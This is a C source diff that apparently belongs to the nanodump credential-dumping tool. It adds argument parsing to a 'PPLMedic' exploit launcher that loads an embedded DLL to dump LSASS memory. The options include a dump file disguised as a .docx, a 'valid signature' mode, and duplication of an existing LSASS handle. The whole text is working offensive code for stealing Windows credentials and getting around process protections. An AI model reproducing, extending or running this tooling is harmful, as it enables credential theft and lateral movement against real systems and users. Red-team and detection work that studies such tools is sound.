@@ -162,21 +162,119 @@ void go(char* args, int length)
 
 #include "nanodump_ppl_medic_dll.x64.h"
 
+#if !defined(PASS_PARAMS_VIA_NAMED_PIPES) || (PASS_PARAMS_VIA_NAMED_PIPES == 0)
+
 int main(int argc, char* argv[])
 {
     if (argc > 1)
     {
         PRINT("This binary doesn't take any parameteres because all the 'dump options' are hardcoded in NanoDumpPPLMedic");
-        PRINT("The idea here is to avoid the interaction between processes as much as possible");
-        PRINT("Modify the first lines of NanoDumpPPLMedic in order to customize how LSASS is dumped");
         return 0;
     }
 
     run_ppl_medic_exploit(
         nanodump_ppl_medic_dll,
-        nanodump_ppl_medic_dll_len);
+        nanodump_ppl_medic_dll_len,
+        0,
+        NULL,
+        FALSE,
+        FALSE,
+        FALSE,
+        FALSE,
+        FALSE);
 
     return 0;
 }
+
+#else
+
+void usage(char* procname)
+{
+    PRINT("usage: %s --write C:\\Windows\\Temp\\doc.docx [--valid] [--duplicate] [--help]", procname);
+    PRINT("Dumpfile options:");
+    PRINT("    --write DUMP_PATH, -w DUMP_PATH");
+    PRINT("            filename of the dump");
+    PRINT("    --valid, -v");
+    PRINT("            create a dump with a valid signature");
+    PRINT("Obtain an LSASS handle via:");
+    PRINT("    --duplicate, -d");
+    PRINT("            duplicate an existing " LSASS " handle");
+    PRINT("Help:");
+    PRINT("    --help, -h");
+    PRINT("            print this help message and leave");
+}
+
+int main(int argc, char* argv[])
+{
+    DWORD  lsass_pid         = 0;
+    BOOL   duplicate_handle  = FALSE;
+    BOOL   elevate_handle    = FALSE;
+    LPSTR  dump_path         = NULL;
+    BOOL   use_valid_sig     = FALSE;
+    BOOL   duplicate_elevate = FALSE;
+    DWORD  spoof_callstack   = 0;
+
+    for (int i = 1; i < argc; ++i)
+    {
+        if (!strncmp(argv[i], "-v", 3) ||
+            !strncmp(argv[i], "--valid", 8))
+        {
+            use_valid_sig = TRUE;
+        }
+        else if (!strncmp(argv[i], "-w", 3) ||
+                 !strncmp(argv[i], "--write", 8))
+        {
+            if (i + 1 >= argc)
+            {
+                PRINT("missing --write value");
+                return 0;
+            }
+            dump_path = argv[++i];
+        }
+        else if (!strncmp(argv[i], "-d", 3) ||
+                 !strncmp(argv[i], "--duplicate", 12))
+        {
+            duplicate_handle = TRUE;
+        }
+        else if (!strncmp(argv[i], "-h", 3) ||
+                 !strncmp(argv[i], "--help", 7))
+        {
+            usage(argv[0]);
+            return 0;
+        }
+        else
+        {
+            PRINT("invalid argument: %s", argv[i]);
+            return 0;
+        }
+    }
+
+    if (!dump_path)
+    {
+        PRINT("You need to provide the --write parameter");
+        return 0;
+    }
+
+    if (!is_full_path(dump_path))
+    {
+        PRINT("You need to provide the full path: %s", dump_path);
+        return 0;
+    }
+
+    run_ppl_medic_exploit(
+        nanodump_ppl_medic_dll,
+        nanodump_ppl_medic_dll_len,
+        lsass_pid,
+        dump_path,
+        use_valid_sig,
+        duplicate_handle,
+        elevate_handle,
+        duplicate_elevate,
+        spoof_callstack);
+
+    return 0;
+}
+
+#endif
 
 #endif
